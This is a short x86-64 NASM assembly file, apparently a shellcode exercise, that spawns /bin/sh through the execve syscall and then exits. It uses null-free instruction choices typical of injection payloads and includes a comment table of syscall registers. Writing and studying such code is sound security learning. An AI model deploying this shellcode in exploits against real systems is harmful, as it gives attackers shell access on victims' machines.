; execute /bin/sh
; %rax	System call	    %rdi	                %rsi	                    %rdx	                    %r10	%r8	%r9
; 59	sys_execve	    const char *filename	const char *const argv[]	const char *const envp[]
; 60	sys_exit	    int error_code

%define SYS_EXECVE 59
%define SYS_EXIT 60

BITS 64
section .text
global _start
_start:
    push SYS_EXECVE  ; set sys_execve syscal number to rax
    pop rax
        
    xor rbx , rbx   ; set NULL to rbx
    push rbx        ; push rbx to stack

    mov rbx, 0x68732f6e69622f2f ; //bin/sh
    push rbx                    ; set //bin/sh to the stack

    mov rdi, rsp ; set //bin/sh to rdi
    xor rsi, rsi ; set NULL to rsi
    xor rdx, rdx ; set NULL to rdx
    syscall


    xor rdi, rdi  ; set 0 to rdi
    push SYS_EXIT  ; set sys_exit syscal number to rax
    pop rax
    syscall